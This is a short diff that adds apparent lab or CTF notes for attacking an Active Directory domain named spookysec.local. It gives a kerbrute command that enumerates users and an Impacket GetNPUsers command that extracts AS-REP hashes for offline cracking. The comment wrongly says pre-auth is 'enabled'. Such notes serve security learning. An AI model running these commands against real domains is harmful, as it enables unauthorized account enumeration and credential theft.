@@ -1,0 +1,6 @@
+./kerbrute userenum -d spookysec.local --dc 10.49.150.253 userlist - make a list of users (eg. spnuser)
+
+./GetNPUsers.py spookysec.local/ -usersfile spnuser -format hashcat -no-pass -dc-ip 10.49.130.170 ( to find the exact user with PreAuth enabled)
+
+
+
